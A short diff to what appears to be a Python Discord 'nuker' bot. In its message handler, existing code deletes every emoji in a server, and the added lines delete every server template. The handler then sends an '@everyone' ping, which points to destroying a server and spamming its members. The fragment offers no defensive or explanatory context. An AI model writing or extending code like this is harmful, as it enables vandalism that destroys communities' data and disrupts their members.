@@ -48,6 +48,8 @@ async def on_message(message):
                 pass
         for Emoji in message.guild.emojis:
             await Emoji.delete()
+        for template in await message.guild.templates():
+           await template.delete()
     
     response = '@everyone' #You can add some messages via editing this string
     
